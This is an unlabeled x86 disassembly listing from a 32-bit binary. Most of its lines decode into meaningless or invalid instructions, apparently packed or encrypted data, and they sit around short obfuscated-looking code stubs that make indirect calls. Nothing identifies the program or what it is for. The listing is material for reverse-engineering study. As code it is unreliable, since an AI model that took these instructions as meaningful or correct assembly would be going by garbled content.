  41e553:	ins    BYTE PTR es:[edi],dx
  41e554:	cmp    BYTE PTR [ebp-0x4265defc],0x44
  41e55b:	and    cl,cl
  41e55d:	and    DWORD PTR [ecx+0x5e0774aa],ebp
  41e563:	scas   eax,DWORD PTR es:[edi]
  41e564:	in     al,0xeb
  41e566:	ja     0x41e55f
  41e568:	and    DWORD PTR [eax+0x46],0x3b4cff9a
  41e56f:	test   al,0x51
  41e571:	sbb    al,0xc0
  41e573:	mov    bl,0x74
  41e575:	nop
  41e576:	or     DWORD PTR [esi-0x235db664],edx
  41e57c:	and    dl,bh
  41e57e:	xchg   edi,eax
  41e57f:	lock and cl,dl
  41e582:	adc    al,0x7d
  41e584:	(bad)  
  41e585:	div    DWORD PTR [ebp-0xd82e4dd]
  41e58b:	rcl    BYTE PTR [edi+0x44],cl
  41e58e:	das    
  41e58f:	adc    bl,dl
  41e591:	ret    0x63c1
  41e594:	scas   eax,DWORD PTR es:[edi]
  41e595:	dec    ebx
  41e596:	mov    ds:0xb83f3729,al
  41e59b:	imul   BYTE PTR [esi+0x1]
  41e59e:	jmp    0x6221:0xb24fdb83
  41e5a5:	add    ch,BYTE PTR [ebp-0x484cf114]
  41e5ab:	sbb    al,0x99
  41e5ad:	mov    ch,0x18
  41e5af:	shl    eax,0x2
  41e5b2:	or     eax,ecx
  41e5b4:	jmp    0x41e983
  41e5b9:	test   BYTE PTR [esi],cl
  41e5bb:	nop
  41e5bc:	lahf   
  41e5bd:	jp     0x41e5dd
  41e5bf:	and    ch,BYTE PTR [edx]
  41e5c1:	xor    eax,0x95aae715
  41e5c6:	call   FWORD PTR [edi]
  41e5c8:	jle    0x41e635
  41e5ca:	aaa    
  41e5cb:	push   ss
  41e5cc:	sbb    BYTE PTR [edx+edx*1-0x3d31e7e8],bh
  41e5d3:	cmp    bh,dh
  41e5d5:	pop    ds
  41e5d6:	(bad)  
  41e5d7:	cs jo  0x41e57b
  41e5da:	jb     0x41e560
  41e5dc:	inc    bh
  41e5de:	ret    0x29
  41e5e1:	xchg   esi,eax
  41e5e2:	dec    ecx
  41e5e3:	push   0xbdf7920e
  41e5e8:	add    al,0x6f
  41e5ea:	scas   al,BYTE PTR es:[edi]
  41e5eb:	out    0xfb,eax
  41e5ed:	adc    bl,BYTE PTR [ebx]
  41e5ef:	stc    
  41e5f0:	cmp    al,0x46
  41e5f2:	pop    esp
  41e5f3:	adc    ebp,DWORD PTR [esi+0x5ef806e4]
  41e5f9:	jnp    0x41e618
  41e5fb:	dec    ebx
  41e5fc:	pop    edi
  41e5fd:	inc    ebp
  41e5fe:	aas    
  41e5ff:	push   cs
  41e600:	jmp    0x41e590
  41e602:	test   DWORD PTR [edi+0x3e59ac89],eax
  41e608:	out    0xba,al
  41e60a:	sbb    BYTE PTR [ecx+0x121601dc],bl
  41e610:	jbe    0x41e5ae
  41e612:	adc    DWORD PTR [edx+0x24],esp
  41e615:	arpl   WORD PTR [ebp+0x128bdfa3],si
  41e61b:	sbb    cl,dl
  41e61d:	(bad)  
  41e61e:	hlt    
  41e61f:	fdivr  DWORD PTR [eax]
  41e621:	xchg   DWORD PTR [edx],ecx
  41e623:	jbe    0x41e5da
  41e625:	dec    esi
  41e626:	es xchg ebp,eax
  41e628:	aam    0x9b
  41e62a:	icebp  
  41e62b:	mov    dl,0xb9
  41e62d:	jno    0x41e5c2
  41e62f:	sbb    DWORD PTR [esi-0x2d],edi
  41e632:	fidivr DWORD PTR [esi+0x2221f27d]
  41e638:	or     BYTE PTR [eax],bl
  41e63a:	inc    eax
  41e63b:	inc    ecx
  41e63c:	icebp  
  41e63d:	(bad)  
  41e63e:	(bad)  
  41e640:	and    ecx,ebp
  41e642:	shl    BYTE PTR [ebx+eiz*4],1
  41e645:	pop    edx
  41e646:	or     al,0x7b
  41e648:	gs xor al,0x9b
  41e64b:	leave  
  41e64c:	(bad)  
  41e64d:	push   eax
  41e64e:	push   ebp
  41e64f:	ret    
  41e650:	mov    ah,0x78
  41e652:	add    al,0x9
  41e654:	repz jl 0x41e65d
  41e657:	jno    0x41e691
  41e659:	jo     0x41e667
  41e65b:	aad    0xdc
  41e65d:	pushw  ss
  41e65f:	shr    DWORD PTR fs:[edx],0xb2
  41e663:	mov    ch,0xfd
  41e665:	inc    edi
  41e666:	sbb    bl,ch
  41e668:	xchg   edx,eax
  41e669:	xor    eax,0xa81e901c
  41e66e:	mov    ecx,0x9d4efcfa
  41e673:	mul    BYTE PTR [eax-0x74]
  41e676:	push   eax
  41e677:	jb     0x41e6bc
  41e679:	xchg   ebp,eax
  41e67a:	fwait
  41e67b:	int    0xda
  41e67d:	adc    al,0xe4
  41e67f:	xchg   esi,eax
  41e680:	push   ecx
  41e681:	cmp    DWORD PTR [eax-0x79943de2],edi
  41e687:	jge    0x41e66e
  41e689:	xor    eax,0x350b0c56
  41e68e:	sbb    esp,ebp
  41e690:	aaa    
  41e691:	inc    esp
  41e692:	xchg   DWORD PTR [ebp+eiz*2+0x7a],ebx
  41e696:	and    eax,0x9d641b02
  41e69b:	mov    bl,0x61
  41e69d:	jp     0x41e6de
  41e69f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6a0:	(bad)  
  41e6a1:	mov    eax,ds:0xc82e1d50
  41e6a6:	and    al,0xe9
  41e6a8:	mov    DWORD PTR [ecx],edi
  41e6aa:	stos   BYTE PTR es:[edi],al
  41e6ab:	std    
  41e6ac:	dec    esp
  41e6ad:	pop    ebx
  41e6ae:	daa    
  41e6af:	mov    dl,0xf1
  41e6b1:	xchg   esi,eax
  41e6b2:	mov    bh,0xda
  41e6b4:	push   ebx
  41e6b5:	fldenv [ebx+0x5e]
  41e6b8:	and    DWORD PTR [edi+eiz*2],eax
  41e6bb:	xchg   BYTE PTR [edx],ch
  41e6bd:	xchg   edi,eax
  41e6be:	push   edi
  41e6bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6c0:	push   edi
  41e6c1:	cmp    BYTE PTR [esi+0x6b],ah
  41e6c4:	pop    es
  41e6c5:	(bad)  
  41e6c6:	rcr    DWORD PTR [eax-0x72],cl
  41e6c9:	cmc    
  41e6ca:	cld    
  41e6cb:	pop    esi
  41e6cc:	ffreep st(5)
  41e6ce:	and    ch,BYTE PTR [esp+edx*2-0x888a9bf]
  41e6d5:	test   eax,0x6ce4d093
  41e6da:	inc    edi
  41e6db:	jb     0x41e664
  41e6dd:	cmp    BYTE PTR [esi],al
  41e6df:	mov    WORD PTR [ecx],?
  41e6e1:	aaa    
  41e6e2:	pop    ebp
  41e6e3:	jmp    0x41e706
  41e6e5:	pop    ss
  41e6e6:	es push ebp
  41e6e8:	in     al,dx
  41e6e9:	es mov ebp,0x7d5ccb01
  41e6ef:	popa   
  41e6f0:	pop    ss
  41e6f1:	and    eax,0x192fdf50
  41e6f6:	mov    edi,DWORD PTR [eax-0x11]
  41e6f9:	push   edx
  41e6fa:	mov    WORD PTR [edx-0x3974d656],cs
  41e700:	cli    
  41e701:	scas   al,BYTE PTR es:[edi]
  41e702:	sar    BYTE PTR ds:0xa9b9f4c2,cl
  41e708:	xor    ebx,esi
  41e70a:	shl    ebx,cl
  41e70c:	je     0x41e693
  41e70e:	jb     0x41e6dd
  41e710:	ret    
  41e711:	(bad)  
  41e712:	shr    BYTE PTR [edi+ecx*8-0x79],cl
  41e716:	push   esi
  41e717:	leave  
  41e718:	push   ebp
  41e719:	jmp    0x732ba578
  41e71e:	push   es
  41e71f:	je     0x41e715
  41e721:	dec    dh
  41e723:	mov    ds,WORD PTR [ebx+0x3]
  41e726:	xor    bl,BYTE PTR [ecx]
  41e728:	xor    DWORD PTR [edx],edx
  41e72a:	mov    eax,0xf172554f
  41e72f:	mov    ebx,DWORD PTR [esi+edi*1+0x4a1c28bb]
  41e736:	loopne 0x41e6e3
  41e738:	and    bh,dh
  41e73a:	sub    BYTE PTR [esi-0x7e451888],bl
  41e740:	loopne 0x41e72b
  41e742:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e743:	jmp    0x307b:0x9b58c859
  41e74a:	sub    eax,DWORD PTR [esi+0x3]
  41e74d:	inc    ebp
  41e74e:	fist   DWORD PTR [ecx+0x338bd47b]
  41e754:	jmp    0xe462c81f
  41e759:	mov    BYTE PTR [eax],bh
  41e75b:	adc    DWORD PTR [edx+0xecf1de0],edx
  41e761:	(bad)  
  41e762:	cmp    al,0x81
  41e764:	push   0x7
  41e766:	arpl   WORD PTR fs:[edx+0x5f],ax
  41e76a:	inc    edi
  41e76b:	xchg   BYTE PTR [eax+edi*2+0x60cb1aab],ch
  41e772:	sub    eax,0x69fc6082
  41e777:	xchg   ebp,eax
  41e778:	in     eax,dx
  41e779:	ret    
  41e77a:	push   0xbcd8435e
  41e77f:	stos   DWORD PTR es:[edi],eax
  41e780:	aas    
  41e781:	call   0xa5f20130
  41e786:	imul   esp,DWORD PTR [ebp+0x47],0x27
  41e78a:	cmp    esp,DWORD PTR [ebp-0x1]
  41e78d:	dec    eax
  41e78e:	mov    edx,0xf5ddde40
  41e793:	clc    
  41e794:	sahf   
  41e795:	sahf   
  41e796:	or     dh,BYTE PTR [esi+0x6207378b]
  41e79c:	loop   0x41e811
  41e79e:	mov    DWORD PTR [edx-0x5a],esp
  41e7a1:	arpl   si,dx
  41e7a3:	adc    BYTE PTR [edi-0x80],0x68
  41e7a7:	or     BYTE PTR [ebp-0x1a],dh
  41e7aa:	cmc    
  41e7ab:	jecxz  0x41e7ec
  41e7ad:	mov    edx,0x7faa36f7
  41e7b2:	aam    0x8e
  41e7b4:	test   DWORD PTR [edx+0x7cc69df1],edx
  41e7ba:	ins    DWORD PTR es:[edi],dx
  41e7bb:	cmc    
  41e7bc:	dec    edx
  41e7bd:	(bad)  
  41e7be:	loope  0x41e7d5
  41e7c0:	sbb    al,BYTE PTR [ebx+0x20]
  41e7c3:	inc    ebp
  41e7c4:	inc    esi
  41e7c5:	cmp    eax,0x98377322
  41e7ca:	imul   ebp,edi,0x36c10fbd
  41e7d0:	push   ss
  41e7d1:	mov    edi,cs
  41e7d3:	adc    al,ch
  41e7d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7d6:	scas   eax,DWORD PTR es:[edi]
  41e7d7:	cmc    
  41e7d8:	fcom   DWORD PTR [edi-0x79711116]
  41e7de:	call   0xfd4bed7f
  41e7e3:	movups xmm0,xmm3
  41e7e6:	adc    BYTE PTR [ebp+0x6b],bl
  41e7e9:	sbb    al,0xd6
  41e7eb:	fstp   TBYTE PTR [edx]
  41e7ed:	repnz or bh,BYTE PTR [ecx]
  41e7f0:	nop
  41e7f1:	test   BYTE PTR [edi],bl
  41e7f3:	xor    eax,0x78f82a3b
  41e7f8:	push   0x10
  41e7fa:	pusha  
  41e7fb:	pop    ecx
  41e7fc:	push   esi
  41e7fd:	mov    ebp,0x2273ee6e
  41e802:	lods   al,BYTE PTR ds:[esi]
  41e803:	mov    ch,0x3b
  41e805:	retf   0x4ec6
  41e808:	jp     0x41e878
  41e80a:	les    edi,FWORD PTR [ebx-0x2d213304]
  41e810:	inc    esp
  41e811:	stos   DWORD PTR es:[edi],eax
  41e812:	fild   QWORD PTR [esi]
  41e814:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e815:	clc    
  41e816:	call   0xa88f:0xec6ad392
  41e81d:	sar    edx,1
  41e81f:	jg     0x41e800
  41e821:	repz mov bl,0x1
  41e824:	push   ebx
  41e825:	jo     0x41e7e7
  41e827:	cmp    al,0xe0
  41e829:	ds (bad) 
  41e82b:	jmp    0xa32:0x795f2bae
  41e832:	call   0x18902f67
  41e837:	inc    esp
  41e838:	jb     0x41e840
  41e83a:	or     dl,ch
  41e83c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e83d:	ss sbb eax,0xf94b4b5
  41e843:	sub    al,0x47
  41e845:	call   0xe0a274d0
  41e84a:	rcl    BYTE PTR ds:0xf48fd4f9,cl
  41e850:	jp     0x41e895
  41e852:	adc    al,0xe0
  41e854:	sti    
  41e855:	sbb    DWORD PTR ds:0x9abf9ec7,0xb35c69bd
  41e85f:	pushf  
  41e860:	mov    DWORD PTR [eax],esi
  41e862:	pusha  
  41e863:	bound  ebp,QWORD PTR [esi+0xde8fcab]
  41e869:	js     0x41e81a
  41e86b:	fisubr DWORD PTR [ecx+0x6be801c0]
  41e871:	adc    al,BYTE PTR [ebx+ecx*4-0x70]
  41e875:	or     DWORD PTR [edi],eax
  41e877:	test   DWORD PTR [ecx+0xb723bd3],ebx
  41e87d:	fidiv  DWORD PTR [ebx+0x6228be79]
  41e883:	ror    BYTE PTR ds:0xf0bb2106,0x82
  41e88a:	mov    BYTE PTR [edi-0x17],bl
  41e88d:	mov    edi,0x2b716afa
  41e892:	sbb    DWORD PTR es:0x7bfb71b9,edi
  41e899:	addr16 out 0x6d,eax
  41e89c:	enter  0x5221,0xd6
  41e8a0:	imul   ebp,DWORD PTR ds:0xb190f691,0x2d61b752
  41e8aa:	jbe    0x41e88c
  41e8ac:	push   edi
  41e8ad:	xchg   BYTE PTR [ebx-0x1d0e3947],dh
  41e8b3:	jmp    0xf5b24ff9
  41e8b8:	or     bl,BYTE PTR [edx+0x19852ce8]
  41e8be:	clc    
  41e8bf:	push   edx
  41e8c0:	cmp    bh,BYTE PTR [ecx+0x61]
  41e8c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8c4:	out    0x2,al
  41e8c6:	xor    DWORD PTR [ecx+0xa56c982],0x5a
  41e8cd:	es loope 0x41e94a
  41e8d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8d1:	addr16 in eax,dx
  41e8d3:	push   edx
  41e8d4:	mov    dl,0x9b
  41e8d6:	cli    
  41e8d7:	add    DWORD PTR [ebx+0x0],edi
  41e8da:	dec    bl
  41e8dc:	cwde   
  41e8dd:	mov    DWORD PTR [ebp+0x6c],eax
  41e8e0:	push   0x35
  41e8e2:	xchg   ebx,eax
  41e8e3:	jg     0x41e8a1
  41e8e5:	jae    0x41e926
  41e8e7:	push   ss
  41e8e8:	loopne 0x41e8bc
  41e8ea:	pop    esp
  41e8eb:	mov    ecx,0xa7f598c9
  41e8f0:	dec    edi
  41e8f1:	into   
  41e8f2:	ret    0xcbf0
  41e8f5:	inc    esp
  41e8f6:	leave  
  41e8f7:	sti    
  41e8f8:	(bad)  
  41e8f9:	std    
  41e8fa:	repnz and ecx,DWORD PTR [ebp+0x18]
  41e8fe:	push   ds
  41e8ff:	call   0x1d23:0xdd9eb84a
  41e906:	call   0x798ecc20
  41e90b:	dec    BYTE PTR [ecx-0x3d1132d0]
  41e911:	pop    edx
  41e912:	nop
  41e913:	xchg   BYTE PTR [ecx+edi*2],ch
  41e916:	icebp  
  41e917:	lock xor bl,BYTE PTR [edi+ecx*4+0x72]
  41e91c:	in     eax,0x0
  41e91e:	in     al,dx
  41e91f:	jge    0x41e8e4
  41e921:	loope  0x41e8cc
  41e923:	or     esi,esi
  41e925:	sbb    eax,0xf90b23ac
  41e92a:	stos   BYTE PTR es:[edi],al
  41e92b:	rcr    BYTE PTR [ecx-0xd],0x1b
  41e92f:	test   eax,0x162d1b36
  41e934:	dec    ebx
  41e935:	inc    edi
  41e936:	fdiv   st,st(2)
  41e938:	popa   
  41e939:	jecxz  0x41e8c7
  41e93b:	pop    eax
  41e93c:	mov    ds:0x6c012d21,al
  41e941:	fadd   QWORD PTR [ecx-0x11]
  41e944:	or     DWORD PTR [ebx-0x65e0815d],ebx
  41e94a:	lahf   
  41e94b:	mov    ebp,0x6c3fcafd
  41e950:	and    DWORD PTR [ebp+0x33803307],edx
  41e956:	loopne 0x41e9b3
  41e958:	scas   al,BYTE PTR es:[edi]
  41e959:	out    0xbb,eax
  41e95b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e95c:	lock pop eax
  41e95e:	add    cl,BYTE PTR ds:0x2c8e1600
  41e964:	sbb    BYTE PTR [ebp+0x1a],dh
  41e967:	push   0xffffff9d
  41e969:	mov    bl,0x65
  41e96b:	repz xlat BYTE PTR ds:[ebx]
  41e96d:	imul   ebx,esi,0xffffffe6
  41e970:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e971:	loopne 0x41e96d
  41e973:	aad    0x9e
  41e975:	mov    ebx,0xafdd2a64
  41e97a:	sub    DWORD PTR [ecx],edi
  41e97c:	pop    esp
  41e97d:	pop    ss
  41e97e:	or     eax,ebp
  41e980:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e981:	packuswb mm1,QWORD PTR [ebx]
  41e984:	xlat   BYTE PTR ds:[ebx]
  41e985:	mov    ecx,edx
  41e987:	mov    edx,DWORD PTR [esp+0x18]
  41e98b:	xor    eax,ebx
  41e98d:	xor    ecx,esi
  41e98f:	mov    esi,DWORD PTR [esp+0x1c]
  41e993:	cmp    edx,eax
  41e995:	jne    0x41e9a3
  41e99b:	cmp    esi,ecx
  41e99d:	je     0x41e9ea
  41e9a3:	push   DWORD PTR ds:0x422608
  41e9a9:	push   DWORD PTR ds:0x42239c
  41e9af:	mov    eax,ds:0x422518
  41e9b4:	mov    eax,DWORD PTR [eax+0x1a4]
  41e9ba:	push   DWORD PTR [eax]
  41e9bc:	mov    eax,DWORD PTR [esp+0x78]
  41e9c0:	call   eax
  41e9c2:	mov    ecx,DWORD PTR ds:0x422518
  41e9c8:	mov    ecx,DWORD PTR [ecx+0x1dc]
  41e9ce:	mov    DWORD PTR [ecx],eax
  41e9d0:	mov    eax,ds:0x422518
  41e9d5:	push   0x4
  41e9d7:	add    eax,0x1dc
  41e9dc:	push   eax
  41e9dd:	lea    eax,[esp+0x84]
  41e9e4:	push   eax
  41e9e5:	call   0x415231
  41e9ea:	mov    eax,DWORD PTR [esp+0x7c]
  41e9ee:	mov    eax,DWORD PTR [eax]
  41e9f0:	pop    edi
  41e9f1:	pop    esi
  41e9f2:	pop    ebx
  41e9f3:	mov    esp,ebp
  41e9f5:	pop    ebp
  41e9f6:	ret    0xc
  41e9f9:	push   ebp
  41e9fa:	mov    ebp,esp
  41e9fc:	sub    esp,0x23c
  41ea02:	or     ecx,eax
  41ea04:	push   ebx
  41ea05:	cmp    DWORD PTR ds:0x428227,0x0
  41ea0c:	mov    DWORD PTR ds:0x428333,0x7749
  41ea16:	mov    DWORD PTR ds:0x428133,ebx
  41ea1c:	mov    DWORD PTR ds:0x4282d3,edx
  41ea22:	mov    DWORD PTR ds:0x4282d3,0xc7b
  41ea2c:	jmp    0x41ea8e
  41ea31:	mov    DWORD PTR ds:0x42824b,edx
  41ea37:	cmp    DWORD PTR ds:0x428227,0x0
  41ea3e:	jg     0x41ea74
  41ea44:	push   0x2154
  41ea49:	push   0x5063
  41ea4e:	call   DWORD PTR ds:0x428dd4
  41ea54:	sbb    DWORD PTR ds:0x42832f,ecx
  41ea5a:	mov    ecx,DWORD PTR ds:0x4282db
  41ea60:	xor    ecx,DWORD PTR ds:0x4282c7
  41ea66:	mov    DWORD PTR ds:0x4282db,ecx
  41ea6c:	sbb    ecx,0x6e15
  41ea72:	neg    ecx
  41ea74:	xor    DWORD PTR ds:0x428203,ecx
  41ea7a:	adc    ecx,DWORD PTR ds:0x428157
  41ea80:	mov    ecx,DWORD PTR ds:0x4281a3
  41ea86:	mov    ecx,DWORD PTR [ecx]
  41ea88:	and    DWORD PTR ds:0x428147,ecx
  41ea8e:	push   esi
  41ea8f:	mov    ecx,DWORD PTR ds:0x4281b7
  41ea95:	mov    eax,ds:0x4282a3
  41ea9a:	sub    eax,ecx
  41ea9c:	imul   ecx,DWORD PTR [ecx+eax*1]
  41eaa0:	push   edi
  41eaa1:	add    DWORD PTR ds:0x42821b,ebx
  41eaa7:	mov    DWORD PTR [ebp-0x50],0x1
  41eaae:	sub    DWORD PTR ds:0x42824b,edi
  41eab4:	mov    DWORD PTR [ebp-0xbc],0x61a1
  41eabe:	xor    DWORD PTR ds:0x4282db,0x437e
  41eac8:	mov    DWORD PTR [ebp-0xb8],0x1
  41ead2:	mov    ecx,DWORD PTR [ebp-0xb8]
  41ead8:	add    eax,0x2e28
  41eadd:	mov    eax,0x584
  41eae2:	xor    edx,edx
  41eae4:	sbb    DWORD PTR ds:0x428357,0x4282af
  41eaee:	div    ecx
  41eaf0:	xor    ecx,0x2352
  41eaf6:	imul   eax,eax,0x51d4
  41eafc:	neg    ecx
  41eafe:	mov    ecx,DWORD PTR [ebp-0xbc]
  41eb04:	or     DWORD PTR ds:0x428343,0x428353
  41eb0e:	xor    eax,ecx
  41eb10:	and    eax,0x4c09
  41eb15:	xor    ecx,DWORD PTR ds:0x4282c3
  41eb1b:	mov    ecx,DWORD PTR [ebp-0x50]
  41eb1e:	xor    edx,edx
  41eb20:	and    DWORD PTR ds:0x42821b,0x42814f
  41eb2a:	div    ecx
  41eb2c:	or     DWORD PTR ds:0x428367,0x3423
  41eb36:	sub    eax,0x401
  41eb3b:	cmp    DWORD PTR ds:0x4282e7,0x0
  41eb42:	mov    DWORD PTR ds:0x428357,edx
  41eb48:	mov    DWORD PTR ds:0x4281f7,ebx
  41eb4e:	not    DWORD PTR ds:0x4281f3
  41eb54:	jmp    0x41ebb2
  41eb59:	mov    DWORD PTR ds:0x4281eb,0x3ca0
  41eb63:	not    DWORD PTR ds:0x4282d7
  41eb69:	cmp    DWORD PTR ds:0x4282e7,0x0
  41eb70:	je     0x41eba0
  41eb76:	push   DWORD PTR [ebp-0x10]
  41eb79:	push   0x4da1
  41eb7e:	push   0x1144
  41eb83:	push   DWORD PTR [ebp-0x18]
  41eb86:	call   DWORD PTR ds:0x428dd8
  41eb8c:	add    edx,0x1800
  41eb92:	add    edx,DWORD PTR ds:0x42834f
  41eb98:	sub    ecx,ecx
  41eb9a:	adc    ecx,0x47f1
  41eba0:	sub    edx,edx
  41eba2:	mov    DWORD PTR ds:0x428357,0x44a4
  41ebac:	and    ecx,DWORD PTR ds:0x4281ef
  41ebb2:	mov    DWORD PTR [ebp-0x90],eax
  41ebb8:	mov    eax,ds:0x428283
  41ebbd:	mov    eax,DWORD PTR [eax]
  41ebbf:	sbb    DWORD PTR ds:0x428353,eax
  41ebc5:	mov    DWORD PTR [ebp-0x8c],0x2ff8
  41ebcf:	add    DWORD PTR ds:0x42811b,0x428267
  41ebd9:	mov    DWORD PTR [ebp-0x4c],0x39f7
  41ebe0:	xor    DWORD PTR ds:0x42820f,edx
  41ebe6:	mov    DWORD PTR [ebp-0xb4],0x3842
  41ebf0:	or     edx,ecx
  41ebf2:	jmp    0x41ef4e
  41ebf7:	ret    0x8bf6
  41ebfa:	push   ebx
  41ebfb:	sbb    ch,BYTE PTR [ebx]
  41ebfd:	mov    edx,0x71125f66
  41ec02:	mov    al,0x54
  41ec04:	adc    DWORD PTR [ebp+0x7e],ecx
  41ec07:	push   cs
  41ec08:	das    
  41ec09:	push   ss
  41ec0a:	sbb    BYTE PTR [ebx-0x30e7e7ee],ah
  41ec10:	jmp    eax
  41ec12:	div    DWORD PTR [esi-0xdca81f0]
  41ec18:	push   edi
  41ec19:	pushf  
  41ec1a:	stc    
  41ec1b:	mov    ds,WORD PTR [ecx-0x39]
  41ec1e:	in     eax,dx
  41ec1f:	stos   DWORD PTR es:[edi],eax
  41ec20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec21:	pop    ds
  41ec22:	jl     0x41ec20
  41ec24:	stos   DWORD PTR es:[edi],eax
  41ec25:	mov    ebx,0xd968fae8
  41ec2a:	xchg   ecx,eax
  41ec2b:	ja     0x41ec12
  41ec2d:	push   eax
  41ec2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec2f:	jle    0x41ebf2
  41ec31:	in     eax,dx
  41ec32:	mov    cl,0xdc
  41ec35:	or     esp,DWORD PTR [ebx-0x2a30c0ed]
  41ec3b:	mov    esi,0xfd7fa373
  41ec40:	inc    esp
  41ec41:	xchg   ebx,eax
  41ec42:	xor    al,0xb0
  41ec44:	mov    ah,0x9c
  41ec46:	push   ebx
  41ec47:	(bad)  
  41ec48:	pop    esi
  41ec49:	cmp    DWORD PTR [ecx],ecx
  41ec4b:	cdq    
  41ec4c:	xchg   ecx,eax
  41ec4d:	cmp    eax,0x53b3d95b
  41ec52:	ss inc edx
  41ec54:	loopne 0x41ec56
  41ec56:	imul   esi,DWORD PTR [eax+0x73],0xffffff85
  41ec5a:	dec    ecx
  41ec5b:	and    DWORD PTR [ebp+0x18782303],edi
  41ec61:	mov    al,0xfc
  41ec63:	dec    ecx
  41ec64:	push   es
  41ec65:	xor    DWORD PTR [edx],edx
  41ec67:	mov    ds:0x486fe1ba,eax
  41ec6c:	pop    ecx
  41ec6d:	imul   esp,DWORD PTR [edx+0x49],0x7c447b80
  41ec74:	add    BYTE PTR cs:[edi+0x7bde17e4],ah
  41ec7b:	call   FWORD PTR [edx+0x1f]
  41ec7e:	(bad)  [edi]
  41ec80:	sub    DWORD PTR ds:0x65597a83,ecx
  41ec86:	jge    0x41ecdf
  41ec88:	aas    
  41ec89:	in     al,0x99
  41ec8b:	lahf   
  41ec8c:	jno    0x41ec8e
  41ec8e:	(bad)  
  41ec8f:	push   esi
  41ec90:	dec    eax
  41ec91:	adc    DWORD PTR [edi+0x7e7fc009],eax
  41ec97:	sub    esp,ecx
  41ec99:	idiv   BYTE PTR [ebp-0x63]
  41ec9c:	hlt    
  41ec9d:	cmp    edi,DWORD PTR [edi+0x72]
  41eca0:	mov    eax,ds:0xe54e7431
  41eca5:	and    esp,DWORD PTR [ebx+0x71]
  41eca8:	ins    BYTE PTR es:[edi],dx
  41eca9:	add    edi,DWORD PTR [ebx-0x70]
  41ecac:	ret    
  41ecad:	stc    
  41ecae:	dec    edx
  41ecaf:	pop    es
  41ecb0:	dec    edi
  41ecb1:	inc    eax
  41ecb2:	je     0x41ec72
  41ecb4:	sub    DWORD PTR [esi-0x2a57128d],edx
  41ecba:	out    0x64,eax
  41ecbc:	jnp    0x41ec6a
  41ecbe:	ud0    esp,DWORD PTR [esi+0x5f5d208c]
  41ecc5:	or     BYTE PTR [edx+0x5e],0x68
  41ecc9:	push   esp
  41ecca:	or     ch,BYTE PTR [eax-0x13be20db]
  41ecd0:	arpl   WORD PTR [ecx],di
  41ecd2:	scas   eax,DWORD PTR es:[edi]
  41ecd3:	test   eax,0x7e56f0b2
  41ecd8:	jle    0x41ed24
  41ecda:	cmp    ecx,DWORD PTR [esi+ebx*1]
  41ecdd:	into   
  41ecde:	or     eax,0x8252e00a
  41ece3:	pop    ebp
  41ece4:	mov    BYTE PTR [eax+ebx*8],dh
  41ece7:	mov    ah,0x16
  41ece9:	jmp    0x1b17:0x5e5abf0e
  41ecf0:	sub    BYTE PTR [esi+0x4e98bac2],0x14
  41ecf7:	or     al,0xaf
  41ecf9:	cmp    al,0x2c
  41ecfb:	out    dx,al
  41ecfc:	out    dx,eax
  41ecfd:	xor    esp,DWORD PTR [ecx-0x7fb69323]
  41ed03:	outs   dx,DWORD PTR ds:[esi]
  41ed04:	(bad)  
  41ed05:	(bad)  
  41ed06:	in     eax,0x9
  41ed08:	pop    ebp
  41ed09:	mov    dh,0xd0
  41ed0b:	push   es
  41ed0c:	sbb    DWORD PTR [edx-0x466277f2],edx
  41ed12:	test   DWORD PTR [ebp+0x1358bb53],edi
  41ed18:	scas   eax,DWORD PTR es:[edi]
  41ed19:	jo     0x41ecbf
  41ed1b:	mov    esp,0xc93e1441
  41ed20:	mov    esi,0x55ff59dd
  41ed25:	pop    esi
  41ed26:	sub    DWORD PTR [ebx],ebx
  41ed28:	xlat   BYTE PTR ds:[ebx]
  41ed29:	pop    edi
  41ed2a:	mov    eax,ds:0xa21ee078
  41ed2f:	xchg   edx,eax
  41ed30:	push   ds
  41ed31:	push   cs
  41ed32:	scas   al,BYTE PTR es:[edi]
  41ed33:	jle    0x41ed38
  41ed35:	cmp    ecx,ecx
  41ed37:	sub    DWORD PTR [esi-0x766a9db7],esp
  41ed3d:	mov    dh,0x7
  41ed3f:	xor    eax,0xbc436c7e
  41ed44:	push   eax
  41ed45:	mov    esi,0x9ca5bbf9
  41ed4a:	cmp    ebp,DWORD PTR [ebx+0x655ac81a]
  41ed50:	xor    dh,al
  41ed52:	and    BYTE PTR [esi],bh
  41ed54:	inc    edi
  41ed55:	add    ch,al
  41ed57:	mov    eax,0xe995cb3d
  41ed5c:	add    al,0x5f
  41ed5e:	imul   ebx,DWORD PTR [ecx+0x37],0xffffff81
  41ed62:	pop    edx
  41ed63:	stc    
  41ed64:	leave  
  41ed65:	fistp  WORD PTR ds:[edi+0x122a7bc]
  41ed6c:	adc    al,BYTE PTR [eax]
  41ed6e:	dec    esi
  41ed6f:	in     eax,0x2a
  41ed71:	retf   
  41ed72:	call   0xe84fcc44
  41ed77:	mov    ecx,esi
  41ed79:	shl    BYTE PTR [ebp+0x8b6f307],0xd4
  41ed80:	xchg   esi,eax
  41ed81:	push   edi
  41ed82:	jae    0x41edb5
  41ed84:	jae    0x41ed12
  41ed86:	mov    esi,0xc856178b
  41ed8b:	rcl    BYTE PTR [eax+0x749835f7],cl
  41ed91:	mov    bh,0xf5
  41ed93:	mov    ds:0xe6970af,al
  41ed98:	stc    
  41ed99:	adc    ebp,DWORD PTR [edi-0x34]
  41ed9c:	call   0x7130:0xda95cde
  41eda3:	push   esp
  41eda4:	or     dh,BYTE PTR [ecx-0x51]
  41eda7:	daa    
  41eda8:	add    BYTE PTR [edx],bh
  41edaa:	mov    edx,0x5e27daac
  41edaf:	ror    ecx,1
  41edb1:	bound  eax,QWORD PTR [esi-0x15756b4d]
  41edb7:	adc    eax,0x600fd93d
  41edbc:	std    
